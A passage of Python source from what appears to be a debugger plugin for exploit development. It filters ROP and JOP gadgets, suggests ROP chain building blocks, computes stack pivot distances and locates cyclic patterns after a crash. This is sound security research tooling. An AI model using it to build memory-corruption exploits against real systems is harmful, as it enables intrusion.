		subregs = ["EAX","ECX","EDX","EBX","EBP","ESI","EDI"]
		regs = dbglib.Registers32BitsOrder
		individual = instructions.split("#")
		cnt = 0
		allgood = True
		toskip = False
		while (cnt < len(individual)-1) and allgood:	# do not check last one, which is the ending instruction
			thisinstr = individual[cnt].strip().upper()
			if thisinstr != "":
				toskip = False
				foundinstruction = False
				for notinterest in notinteresting:
					if thisinstr.find(notinterest) > -1:
						toskip= True 
				if not toskip:
					for interest in interesting:
						if thisinstr.find(interest) > -1:
							foundinstruction = True
					if not foundinstruction:
						#check the conditional instructions
						if thisinstr.find("MOV DWORD PTR DS:[E") > -1:
							thisinstrparts = thisinstr.split(",")
							if len(thisinstrparts) > 1:
								if thisinstrparts[1] in regs:
									foundinstruction = True
						# other exceptions - don't combine ADD BYTE or ADD DWORD with XCHG EAX,ESI - EAX may not be writeable
						#if instructions.strip().startswith("# XCHG") and (thisinstr.find("ADD DWORD") > -1 or thisinstr.find("ADD BYTE") > -1) and not instructions.strip().startswith("# XCHG EAX,ESI") :
							# allow - tricky case, but sometimes needed
						#	foundinstruction = True
					allgood = foundinstruction
				else:
					allgood = False
			cnt += 1
		return allgood
	return False
	
def isInterestingJopGadget(instructions):
	interesting =	[
					"POP E", "XCHG E", "LEA E", "PUSH E", "XOR E", "AND E", "NEG E", 
					"OR E", "ADD E", "SUB E", "INC E", "DEC E", "POPAD", "PUSHAD",
					"SUB A", "ADD A", "NOP", "ADC E",
					"SUB BH", "SUB BL", "ADD BH", "ADD BL", 
					"SUB CH", "SUB CL", "ADD CH", "ADD CL",
					"SUB DH", "SUB DL", "ADD DH", "ADD DL",
					"MOV E", "CLC", "CLD", "FS:", "FPA"
					]
	notinteresting = [ "MOV ESP,EBP", "LEA ESP"	]
	regs = dbglib.Registers32BitsOrder
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	popfound = False
	toskip = False
	# what is the jmp instruction ?
	lastinstruction = individual[len(individual)-1].replace("[","").replace("+"," ").replace("]","").strip()
	
	jmp = lastinstruction.split(' ')[1].strip().upper().replace(" ","")
	
	regs = ["EAX","EBX","ECX","EDX","ESI","EDI","EBP","ESP"]
	regs.remove(jmp)
	if jmp != "ESP":
		if instructions.find("POP "+jmp) > -1:
			popfound=True
		else:
			for reg in regs:
				poploc = instructions.find("POP "+reg)
				if (poploc > -1):
					if (instructions.find("MOV "+reg+","+jmp) > poploc) or (instructions.find("XCHG "+reg+","+jmp) > poploc) or (instructions.find("XCHG "+jmp+","+reg) > poploc):
						popfound = True
		allgood = popfound
	return allgood

def readGadgetsFromFile(filename):
	"""
	Reads a mona/msf generated rop file 
	
	Arguments :
	filename - the full path + filename of the source file
	
	Return :
	dictionary containing the gadgets (grouped by ending type)
	"""
	
	readopcodes = {}
	
	srcfile = open(filename,"rb")
	content = srcfile.readlines()
	srcfile.close()
	msffiledetected = False
	#what kind of file do we have
	for thisLine in content:
		if thisLine.find("mod:") > -1 and thisLine.find("ver:") > -1 and thisLine.find("VA") > -1:
			msffiledetected = True
			break
	if msffiledetected:
		dbg.log("[+] Importing MSF ROP file...")
		addrline = 0
		ending = ""
		thisinstr = ""
		thisptr = ""
		for thisLine in content:
			if thisLine.find("[addr:") == 0:
				thisLineparts = thisLine.split("]")
				if addrline == 0:	
					thisptr = hexStrToInt(thisLineparts[0].replace("[addr: ",""))
				thisLineparts = thisLine.split("\t")
				thisinstrpart = thisLineparts[len(thisLineparts)-1].upper().strip()
				if thisinstrpart != "":
					thisinstr += " # " + thisinstrpart
					ending = thisinstrpart
				addrline += 1
			else:
				addrline = 0
				if thisptr != "" and ending != "" and thisinstr != "":
					if not ending in readopcodes:
						readopcodes[ending] = [thisptr,thisinstr]
					else:
						readopcodes[ending] += ([thisptr,thisinstr])
				thisptr = ""
				ending = ""
				thisinstr = ""
		
	else:
		dbg.log("[+] Importing Mona legacy ROP file...")
		for thisLine in content:
			if isAsciiString(thisLine.replace("\r","").replace("\n","")):
				refpointer,instr = splitToPtrInstr(thisLine)
				if refpointer != -1:
					#get ending
					instrparts = instr.split("#")
					ending = instrparts[len(instrparts)-1]
					if not ending in readopcodes:
						readopcodes[ending] = [refpointer,instr]
					else:
						readopcodes[ending] += ([refpointer,instr])
	return readopcodes
	
def isGoodGadgetPtr(gadget,criteria):
	if gadget in CritCache:
		return CritCache[gadget]
	else:
		gadgetptr = MnPointer(gadget)
		status = meetsCriteria(gadgetptr,criteria)
		CritCache[gadget] = status
		return status
		
def getStackPivotDistance(gadget,distance=0):
	allgadgets = gadget.split(" # ")
	offset = 0
	gadgets = []
	splitter = re.compile(",")
	mindistance = 0
	maxdistance = 0
	distanceparts = splitter.split(str(distance))
	if len(distanceparts) == 1:
		maxdistance = 99999999
		if str(distance).lower().startswith("0x"):
			mindistance = hexStrToInt(mindistance)
		else:
			mindistance = int(distance)
	else:
		mindistance = distanceparts[0]
		maxdistance = distanceparts[1]
		if str(mindistance).lower().startswith("0x"):
			mindistance = hexStrToInt(mindistance)
		else:
			mindistance = int(distanceparts[0])
		if str(maxdistance).lower().startswith("0x"):
			maxdistance = hexStrToInt(maxdistance)
		else:
			maxdistance = int(distanceparts[1])
	for thisgadget in allgadgets:
		if thisgadget.strip() != "":
			gadgets.append(thisgadget.strip())
	if len(gadgets) > 1:
		# calculate the entire distance
		for g in gadgets:
			if g.find("POP") == 0 or g.find("ADD ESP,") == 0 or g.find("PUSH") == 0 or g.find("RET") == 0 or g.find("SUB ESP,") == 0 or g.find("INC ESP") == 0 or g.find("DEC ESP") == 0:
				if g.strip().find("ADD ESP,") == 0:
					parts = g.split(",")
					try:
						offset += hexStrToInt(parts[1])
					except:
						pass
				if g.strip().find("SUB ESP,") == 0:
					parts = g.split(",")
					try:
						offset -= hexStrToInt(parts[1])
					except:
						pass
				if g.strip().find("INC ESP") == 0:
					offset += 1
				if g.strip().find("DEC ESP") == 0:
					offset -= 1					
				if g.strip().find("POP ") == 0:
					offset += 4
				if g.strip().find("PUSH ") == 0:
					offset -= 4
				if g.strip().find("POPAD") == 0:
					offset += 32
				if g.strip().find("PUSHAD") == 0:
					offset -= 32
			else:
				if (g.find("DWORD PTR") > 0 or g.find("[") > 0) and not g.find("FS") > 0:
					return 0
	if mindistance <= offset and offset <= maxdistance:
		return offset
	return 0
		
def isGoodGadgetInstr(instruction):
	if isAsciiString(instruction):
		forbidden = [
					"???", "LEAVE", "JMP ", "CALL ", "JB ", "JL ", "JE ", "JNZ ", 
					"JGE ", "JNS ","SAL ", "LOOP", "LOCK", "BOUND", "SAR", "IN ", 
					"OUT ", "RCL", "RCR", "ROL", "ROR", "SHL", "SHR", "INT", "JECX",
					"JNP", "JPO", "JPE", "JCXZ", "JA", "JB", "JNA", "JNB", "JC", "JNC",
					"JG", "JLE", "MOVS", "CMPS", "SCAS", "LODS", "STOS", "REP", "REPE",
					"REPZ", "REPNE", "REPNZ", "LDS", "FST", "FIST", "FMUL", "FDIVR",
					"FSTP", "FST", "FLD", "FDIV", "FXCH", "JS ", "FIDIVR", "SBB",
					"SALC", "ENTER", "CWDE", "FCOM", "LAHF", "DIV", "JO", "OUT", "IRET",
					"FILD", "RETF","HALT","HLT","AAM","FINIT","INT3"
					]
		for instr in forbidden:
			if instruction.upper().find(instr) > -1:
				return False
		return True
	return False
	
def isGoodJopGadgetInstr(instruction):
	if isAsciiString(instruction):
		forbidden = [
					"???", "LEAVE", "RETN", "CALL ", "JB ", "JL ", "JE ", "JNZ ", 
					"JGE ", "JNS ","SAL ", "LOOP", "LOCK", "BOUND", "SAR", "IN ", 
					"OUT ", "RCL", "RCR", "ROL", "ROR", "SHL", "SHR", "INT", "JECX",
					"JNP", "JPO", "JPE", "JCXZ", "JA", "JB", "JNA", "JNB", "JC", "JNC",
					"JG", "JLE", "MOVS", "CMPS", "SCAS", "LODS", "STOS", "REP", "REPE",
					"REPZ", "REPNE", "REPNZ", "LDS", "FST", "FIST", "FMUL", "FDIVR",
					"FSTP", "FST", "FLD", "FDIV", "FXCH", "JS ", "FIDIVR", "SBB",
					"SALC", "ENTER", "CWDE", "FCOM", "LAHF", "DIV", "JO", "OUT", "IRET",
					"FILD", "RETF","HALT","HLT","AAM","FINIT"
					]
		for instr in forbidden:
			if instruction.upper().find(instr) > -1:
				return False
		return True	
	return False

def isGadgetEnding(instruction,endings,verbosity=False):
	endingfound=False
	for ending in endings:
		if instruction.lower().find(ending.lower()) > -1:
			endingfound = True
	return endingfound

def getRopSuggestion(ropchains,allchains):
	suggestions={}
	# pushad
	# ======================
	regs = ["EAX","EBX","ECX","EDX","EBP","ESI","EDI"]
	pushad_allowed = [ "INC ","DEC ","OR ","XOR ","LEA ","ADD ","SUB ", "PUSHAD", "RETN ", "NOP", "POP ","PUSH EAX","PUSH EDI","ADC ","FPATAN","MOV E" , "TEST ", "CMP "]
	for r in regs:
		pushad_allowed.append("MOV "+r+",DWORD PTR DS:[ESP")	#stack
		pushad_allowed.append("MOV "+r+",DWORD PTR SS:[ESP")	#stack
		pushad_allowed.append("MOV "+r+",DWORD PTR DS:[ESI")	#virtualprotect
		pushad_allowed.append("MOV "+r+",DWORD PTR SS:[ESI")	#virtualprotect
		pushad_allowed.append("MOV "+r+",DWORD PTR DS:[EBP")	#stack
		pushad_allowed.append("MOV "+r+",DWORD PTR SS:[EBP")	#stack
		for r2 in regs:
			pushad_allowed.append("MOV "+r+","+r2)
			pushad_allowed.append("XCHG "+r+","+r2)
			pushad_allowed.append("LEA "+r+","+r2)
	pushad_notallowed = ["POP ESP","POPAD","PUSH ESP","MOV ESP","ADD ESP", "INC ESP","DEC ESP","XOR ESP","LEA ESP","SS:","DS:"]
	for gadget in ropchains:
		gadgetinstructions = ropchains[gadget].strip()
		if gadgetinstructions.find("PUSHAD") == 2:
			# does chain only contain allowed instructions
			# one pop is allowed, as long as it's not pop esp
			# push edi and push eax are allowed too (ropnop)
			if gadgetinstructions.count("POP ") < 2 and suggestedGadgetCheck(gadgetinstructions,pushad_allowed,pushad_notallowed):
				toadd={}
				toadd[gadget] = gadgetinstructions
				if not "pushad" in suggestions:
					suggestions["pushad"] = toadd
				else:
					suggestions["pushad"] = mergeOpcodes(suggestions["pushad"],toadd)
	# pick up a pointer
	# =========================
	pickedupin = []
	resulthash = ""
	allowedpickup = True
	for r in regs:
		for r2 in regs:
			pickup_allowed = ["NOP","RETN ","INC ","DEC ","OR ","XOR ","MOV ","LEA ","ADD ","SUB ","POP","ADC ","FPATAN", "TEST ", "CMP "]
			pickup_target = []
			pickup_notallowed = []
			pickup_allowed.append("MOV "+r+",DWORD PTR SS:["+r2+"]")
			pickup_allowed.append("MOV "+r+",DWORD PTR DS:["+r2+"]")
			pickup_target.append("MOV "+r+",DWORD PTR SS:["+r2+"]")
			pickup_target.append("MOV "+r+",DWORD PTR DS:["+r2+"]")
			pickup_notallowed = ["POP "+r, "MOV "+r+",E", "LEA "+r+",E", "MOV ESP", "XOR ESP", "LEA ESP", "MOV DWORD PTR", "DEC ESP"]
			for gadget in ropchains:
				gadgetinstructions = ropchains[gadget].strip()	
				allowedpickup = False
				for allowed in pickup_target:
					if gadgetinstructions.find(allowed) == 2 and gadgetinstructions.count("DWORD PTR") == 1:
						allowedpickup = True
				if allowedpickup:
					if suggestedGadgetCheck(gadgetinstructions,pickup_allowed,pickup_notallowed):
						toadd={}
						toadd[gadget] = gadgetinstructions
						resulthash = "pickup pointer into "+r.lower()
						if not resulthash in suggestions:
							suggestions[resulthash] = toadd
						else:
							suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
						if not r in pickedupin:
							pickedupin.append(r)
	if len(pickedupin) == 0:
		for r in regs:
			for r2 in regs:
				pickup_allowed = ["NOP","RETN ","INC ","DEC ","OR ","XOR ","MOV ","LEA ","ADD ","SUB ","POP", "ADC ","FPATAN", "TEST ", "CMP "]
				pickup_target = []
				pickup_notallowed = []
				pickup_allowed.append("MOV "+r+",DWORD PTR SS:["+r2+"+")
				pickup_allowed.append("MOV "+r+",DWORD PTR DS:["+r2+"+")
				pickup_target.append("MOV "+r+",DWORD PTR SS:["+r2+"+")
				pickup_target.append("MOV "+r+",DWORD PTR DS:["+r2+"+")
				pickup_notallowed = ["POP "+r, "MOV "+r+",E", "LEA "+r+",E", "MOV ESP", "XOR ESP", "LEA ESP", "MOV DWORD PTR"]
				for gadget in ropchains:
					gadgetinstructions = ropchains[gadget].strip()	
					allowedpickup = False
					for allowed in pickup_target:
						if gadgetinstructions.find(allowed) == 2 and gadgetinstructions.count("DWORD PTR") == 1:
							allowedpickup = True
					if allowedpickup:
						if suggestedGadgetCheck(gadgetinstructions,pickup_allowed,pickup_notallowed):
							toadd={}
							toadd[gadget] = gadgetinstructions
							resulthash = "pickup pointer into "+r.lower()
							if not resulthash in suggestions:
								suggestions[resulthash] = toadd
							else:
								suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
							if not r in pickedupin:
								pickedupin.append(r)
	# move pointer into another pointer
	# =================================
	for reg in regs:	#from
		for reg2 in regs:	#to
			if reg != reg2:
				moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "XCHG ", "ADC ","FPATAN", "TEST ", "CMP "]
				moveptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:","PUSHAD","POPAD", "DEC ESP"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
				# if we didn't find any, expand the search
				if not ("move " + reg + " -> " + reg2).lower() in suggestions:
					moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "XCHG ", "ADC ","FPATAN", "TEST ", "CMP "]
					moveptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"PUSHAD","POPAD", "DEC ESP"]
					suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
				
		reg2 = "ESP"	#special case
		if reg != reg2:
			moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "MOV ", "XCHG ", "ADC ", "TEST ", "CMP "]
			moveptr_notallowed = ["ADD "+reg2, "ADC "+reg2, "POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:","PUSHAD","POPAD", "DEC ESP"]
			suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
			
	# xor pointer into another pointer
	# =================================
	for reg in regs:	#from
		for reg2 in regs:	#to
			if reg != reg2:
				xorptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "XCHG ", "ADC ","FPATAN", "TEST ", "CMP "]
				xorptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:","PUSHAD","POPAD", "DEC ESP"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("XOR",reg,reg2,ropchains,xorptr_allowed,xorptr_notallowed))

	# get stack pointer
	# =================
	for reg in regs:
		moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ","MOV ", "ADC ","FPATAN", "TEST ", "CMP "]
		moveptr_notallowed = ["POP ESP","MOV ESP,","XCHG ESP,","XOR ESP","LEA ESP,","AND ESP", "ADD ESP", "],","SUB ESP","OR ESP"]
		moveptr_notallowed.append("POP "+reg)
		moveptr_notallowed.append("MOV "+reg)
		moveptr_notallowed.append("XCHG "+reg)
		moveptr_notallowed.append("XOR "+reg)
		moveptr_notallowed.append("LEA "+reg)
		moveptr_notallowed.append("AND "+reg)
		suggestions = mergeOpcodes(suggestions,getRegToReg("MOVE","ESP",reg,allchains,moveptr_allowed,moveptr_notallowed))
	# add something to register
	# =========================
	for reg in regs:	#from
		for reg2 in regs:	#to
			if reg != reg2:
				moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ","FPATAN", "TEST ", "CMP "]
				moveptr_notallowed = ["POP "+reg2,"MOV "+reg2+",","XCHG "+reg2+",","XOR "+reg2,"LEA "+reg2+",","AND "+reg2,"DS:","SS:", "DEC ESP"]
				suggestions = mergeOpcodes(suggestions,getRegToReg("ADD",reg,reg2,ropchains,moveptr_allowed,moveptr_notallowed))
	# add value to register
	# =========================
	for reg in regs:	#to
		moveptr_allowed = ["NOP","RETN","POP ","INC ","DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ", "SUB ","FPATAN", "TEST ", "CMP "]
		moveptr_notallowed = ["POP "+reg,"MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP"]
		suggestions = mergeOpcodes(suggestions,getRegToReg("ADDVAL",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))	

	#inc reg
	# =======
	for reg in regs:
		moveptr_allowed = ["NOP","RETN","POP ","INC " + reg,"DEC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ", "SUB ","FPATAN", "TEST ", "CMP "]
		moveptr_notallowed = ["POP "+reg,"MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP", "DEC "+reg]
		suggestions = mergeOpcodes(suggestions,getRegToReg("INC",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))
		
	#dec reg
	# =======
	for reg in regs:
		moveptr_allowed = ["NOP","RETN","POP ","DEC " + reg,"INC ","OR ","XOR ","ADD ","PUSH ","AND ", "ADC ", "SUB ","FPATAN", "TEST ", "CMP "]
		moveptr_notallowed = ["POP "+reg,"MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP", "INC "+reg]
		suggestions = mergeOpcodes(suggestions,getRegToReg("DEC",reg,reg,ropchains,moveptr_allowed,moveptr_notallowed))	
	#popad reg
	# =======
	popad_allowed = ["POPAD","RETN","INC ","DEC ","OR ","XOR ","ADD ","AND ", "ADC ", "SUB ","FPATAN","POP ", "TEST ", "CMP "]
	popad_notallowed = ["POP ESP","PUSH ESP","MOV ESP","ADD ESP", "INC ESP","DEC ESP","XOR ESP","LEA ESP","SS:","DS:"]
	for gadget in ropchains:
		gadgetinstructions = ropchains[gadget].strip()
		if gadgetinstructions.find("POPAD") == 2:
			if suggestedGadgetCheck(gadgetinstructions,popad_allowed,popad_notallowed):
				toadd={}
				toadd[gadget] = gadgetinstructions
				if not "popad" in suggestions:
					suggestions["popad"] = toadd
				else:
					suggestions["popad"] = mergeOpcodes(suggestions["popad"],toadd)				
	# pop
	# ===
	for reg in regs:
		pop_allowed = "POP "+reg+" # RETN"
		pop_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			if gadgetinstructions.find(pop_allowed) == 2:
				resulthash = "pop "+reg.lower()
				toadd = {}
				toadd[gadget] = gadgetinstructions
				if not resulthash in suggestions:
					suggestions[resulthash] = toadd
				else:
					suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)
					
	# check if we have a pop for each reg
	for reg in regs:
		r = reg.lower()
		if not "pop "+r in suggestions:
			pop_notallowed = ["MOV "+reg+",","XCHG "+reg+",","XOR "+reg,"LEA "+reg+",","DS:","SS:", "DEC ESP", "DEC "+reg, "INC " + reg,"PUSH ","XOR "+reg]
			for rchain in ropchains:
				rparts = ropchains[rchain].strip().split("#")
				chainok = False
				if rparts[1].strip() == "POP " + reg:
						chainok = True
				if chainok:
					for rpart in rparts:
						thisinstr = rpart.strip()
						for pna in pop_notallowed:
							if thisinstr.find(pna) > -1:
								chainok = False
								break
				if chainok:
					toadd = {}
					toadd[rchain] = thisinstr				
					if not "pop " + r in suggestions:
						suggestions["pop " + r] = toadd
					else:
						suggestions["pop " + r] = mergeOpcodes(suggestions["pop " + r],toadd)
	# neg
	# ===
	for reg in regs:
		neg_allowed = "NEG "+reg+" # RETN"
		neg_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			if gadgetinstructions.find(neg_allowed) == 2:
				resulthash = "neg "+reg.lower()
				toadd = {}
				toadd[gadget] = gadgetinstructions
				if not resulthash in suggestions:
					suggestions[resulthash] = toadd
				else:
					suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)		
	# empty
	# =====
	for reg in regs:
		empty_allowed = ["XOR "+reg+","+reg+" # RETN","MOV "+reg+",FFFFFFFF # INC "+reg+" # RETN", "SUB "+reg+","+reg+" # RETN", "PUSH 0 # POP "+reg + " # RETN", "IMUL "+reg+","+reg+",0 # RETN"]
		empty_notallowed = []
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			for empty in empty_allowed:
				if gadgetinstructions.find(empty) == 2:
					resulthash = "empty "+reg.lower()
					toadd = {}
					toadd[gadget] = gadgetinstructions
					if not resulthash in suggestions:
						suggestions[resulthash] = toadd
					else:
						suggestions[resulthash] = mergeOpcodes(suggestions[resulthash],toadd)						
	return suggestions

def getRegToReg(type,fromreg,toreg,ropchains,moveptr_allowed,moveptr_notallowed):
	moveptr = []
	instrwithout = ""
	toreg = toreg.upper()
	srcval = False
	resulthash = ""
	musthave = ""
	if type == "MOVE":
		moveptr.append("MOV "+toreg+","+fromreg)
		moveptr.append("LEA "+toreg+","+fromreg)
		#if not (fromreg == "ESP" or toreg == "ESP"):
		moveptr.append("XCHG "+fromreg+","+toreg)
		moveptr.append("XCHG "+toreg+","+fromreg)
		moveptr.append("PUSH "+fromreg)
		moveptr.append("ADD "+toreg+","+fromreg)
		moveptr.append("ADC "+toreg+","+fromreg)		
		moveptr.append("XOR "+toreg+","+fromreg)
	if type == "XOR":
		moveptr.append("XOR "+toreg+","+fromreg)		
	if type == "ADD":
		moveptr.append("ADD "+toreg+","+fromreg)
		moveptr.append("ADC "+toreg+","+fromreg)		
		moveptr.append("XOR "+toreg+","+fromreg)
	if type == "ADDVAL":
		moveptr.append("ADD "+toreg+",")
		moveptr.append("ADC "+toreg+",")		
		moveptr.append("XOR "+toreg+",")		
		moveptr.append("SUB "+toreg+",")	
		srcval = True
		resulthash = "add value to " + toreg
	if type == "INC":
		moveptr.append("INC "+toreg)
		resulthash = "inc " + toreg
	if type == "DEC":
		moveptr.append("DEC "+toreg)
		resulthash = "dec " + toreg		
	results = {}
	if resulthash == "":
		resulthash = type +" "+fromreg+" -> "+toreg
	resulthash = resulthash.lower()
	for tocheck in moveptr:
		origtocheck = tocheck
		for gadget in ropchains:
			gadgetinstructions = ropchains[gadget].strip()
			if gadgetinstructions.find(tocheck) == 2:
				moveon = True
				if srcval:
					#check if src is a value
					inparts = gadgetinstructions.split(",")
					if len(inparts) > 1:
						subinparts = inparts[1].split(" ")
						if isHexString(subinparts[0].strip()):
							tocheck = tocheck + subinparts[0].strip()
						else:
							moveon = False						
				if moveon:
					instrwithout = gadgetinstructions.replace(tocheck,"")
					if tocheck == "PUSH "+fromreg:
						popreg = instrwithout.find("POP "+toreg)
						popall = instrwithout.find("POP")
						#make sure pop matches push
						nrpush = gadgetinstructions.count("PUSH ")
						nrpop = gadgetinstructions.count("POP ")
						pushpopmatch = False
						if nrpop >= nrpush:
							pushes = []
							pops = []
							ropparts = gadgetinstructions.split(" # ")
							pushindex = 0
							popindex = 0
							cntpush = 0
							cntpop = nrpush
							for parts in ropparts:
								if parts.strip() != "":
									if parts.strip().find("PUSH ") > -1:
										pushes.append(parts)
										if parts.strip() == "PUSH "+fromreg:
											cntpush += 1
									if parts.strip().find("POP ") > -1:
										pops.append(parts)
										if parts.strip() == "POP "+toreg:
											cntpop -= 1
							if cntpush == cntpop:
								#dbg.log("%s : POPS : %d, PUSHES : %d, pushindex : %d, popindex : %d" % (gadgetinstructions,len(pops),len(pushes),pushindex,popindex))
								#dbg.log("push at %d, pop at %d" % (cntpush,cntpop))
								pushpopmatch = True
						if (popreg == popall) and instrwithout.count("POP "+toreg) == 1 and pushpopmatch:
							toadd={}
							toadd[gadget] = gadgetinstructions
							if not resulthash in results:
								results[resulthash] = toadd
							else:
								results[resulthash] = mergeOpcodes(results[resulthash],toadd)
					else:			
						if suggestedGadgetCheck(instrwithout,moveptr_allowed,moveptr_notallowed):
							toadd={}
							toadd[gadget] = gadgetinstructions
							if not resulthash in results:
								results[resulthash] = toadd
							else:
								results[resulthash] = mergeOpcodes(results[resulthash],toadd)
			tocheck = origtocheck
	return results
	
def suggestedGadgetCheck(instructions,allowed,notallowed):
	individual = instructions.split("#")
	cnt = 0
	allgood = True
	toskip = False
	while (cnt < len(individual)-1) and allgood:	# do not check last one, which is the ending instruction
		thisinstr = individual[cnt].upper()
		if thisinstr.strip() != "":
			toskip = False
			foundinstruction = False
			for notok in notallowed:
				if thisinstr.find(notok) > -1:
					toskip= True 
			if not toskip:
				for ok in allowed:
					if thisinstr.find(ok) > -1:
						foundinstruction = True
				allgood = foundinstruction
			else:
				allgood = False
		cnt += 1
	return allgood

def dumpMemoryToFile(address,size,filename):
	"""
	Dump 'size' bytes of memory to a file
	
	Arguments:
	address  - the address where to read
	size     - the number of bytes to read
	filename - the name of the file where to write the file
	
	Return:
	Boolean - True if the write succeeded
	"""

	WRITE_SIZE = 10000
	
	dbg.log("Dumping %d bytes from address 0x%08x to %s..."	% (size, address, filename))
	out = open(filename,'wb')
	
	# write by increments of 10000 bytes
	current = 0
	while current < size :
		bytesToWrite = size - current
		if ( bytesToWrite >= WRITE_SIZE):
			bytes = dbg.readMemory(address+current,WRITE_SIZE)
			out.write(bytes)
			current += WRITE_SIZE
		else:
			bytes = dbg.readMemory(address+current,bytesToWrite)
			out.write(bytes)
			current += bytesToWrite
	out.close()
	
	return True
		

def goFindMSP(distance = 0,args = {}):
	"""
	Finds all references to cyclic pattern in memory
	
	Arguments:
	None
	
	Return:
	Dictonary with results of the search operation
	"""
	results = {}
	regs = dbg.getRegs()
	criteria = {}
	criteria["accesslevel"] = "*"
	
	tofile = ""
	
	global silent
	oldsilent = silent
	silent=True	
	
	fullpattern = createPattern(50000,args)
	factor = 1
	
	#are we attached to an application ?
	if dbg.getDebuggedPid() == 0:
		dbg.log("*** Attach to an application, and trigger a crash with a cyclic pattern ! ***",highlight=1)
		return	{}
	
	#1. find beging of cyclic pattern in memory ?

	patbegin = createPattern(6,args)
	
	silent=oldsilent
	pattypes = ["normal","unicode","lower","upper"]
	if not silent:
		dbg.log("[+] Looking for cyclic pattern in memory")
	tofile += "[+] Looking for cyclic pattern in memory\n"
	for pattype in pattypes:
		dbg.updateLog()
		searchPattern = []
		#create search pattern
		factor = 1
		if pattype == "normal":
			searchPattern.append([patbegin, patbegin])	
		if pattype == "unicode":
			patbegin_unicode = ""
			factor = 0.5
			for pbyte in patbegin:
				patbegin_unicode += pbyte + "\x00"
			searchPattern.append([patbegin_unicode, patbegin_unicode])	
		if pattype == "lower":
			searchPattern.append([patbegin.lower(), patbegin.lower()])	
		if pattype == "upper":
			searchPattern.append([patbegin.upper(), patbegin.upper()])	
		#search
		pointers = searchInRange(searchPattern,0,TOP_USERLAND,criteria)
		memory={}
		if len(pointers) > 0:
			for ptrtypes in pointers:
				for ptr in pointers[ptrtypes]:
					#get size
					thissize = getPatternLength(ptr,pattype,args)
					if thissize > 0:
						if not silent:
							dbg.log("    Cyclic pattern (%s) found at 0x%s (length %d bytes)" % (pattype,toHex(ptr),thissize))
						tofile += "    Cyclic pattern (%s) found at 0x%s (length %d bytes)\n" % (pattype,toHex(ptr),thissize)
						if not ptr in memory:
							memory[ptr] = ([thissize,pattype])
					#get distance from ESP
					if "ESP" in regs:
						thisesp = regs["ESP"]
						thisptr = MnPointer(ptr)
						if thisptr.isOnStack():
							if ptr > thisesp:
								if not silent:
									dbg.log("    -  Stack pivot between %d & %d bytes needed to land in this pattern" % (ptr-thisesp,ptr-thisesp+thissize))
								tofile += "    -  Stack pivot between %d & %d bytes needed to land in this pattern\n" % (ptr-thisesp,ptr-thisesp+thissize)
			if not "memory" in results:
				results["memory"] = memory
			
	#2. registers overwritten ?
	if not silent:
		dbg.log("[+] Examining registers")
	registers = {}
	registers_to = {}
	for reg in regs:
		for pattype in pattypes:
			dbg.updateLog()		
			regpattern = fullpattern
			hexpat = toHex(regs[reg])
			factor = 1
			hexpat = toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[0]+hexpat[1])
			if pattype == "upper":
				regpattern = regpattern.upper()
			if pattype == "lower":
				regpattern = regpattern.lower()
			if pattype == "unicode":
				regpattern = toUnicode(regpattern)
				factor = 0.5
				
			offset = regpattern.find(hexpat)
			if offset > -1:
				if pattype == "unicode":
					offset = offset * factor
				if not silent:
					dbg.log("    %s overwritten with %s pattern : 0x%s (offset %d)" % (reg,pattype,toHex(regs[reg]),offset))
				tofile += "    %s overwritten with %s pattern : 0x%s (offset %d)\n" % (reg,pattype,toHex(regs[reg]),offset)
				if not reg in registers:
					registers[reg] = ([regs[reg],offset,pattype])

					
			# maybe register points into cyclic pattern
			mempat = ""
			try:
				mempat = dbg.readMemory(regs[reg],4)
			except:
				pass
			
			if mempat != "":
				if pattype == "normal":
					regpattern = fullpattern
				if pattype == "upper":
					regpattern = fullpattern.upper()
				if pattype == "lower":
					regpattern = fullpattern.lower()
				if pattype == "unicode":
					mempat = dbg.readMemory(regs[reg],8)
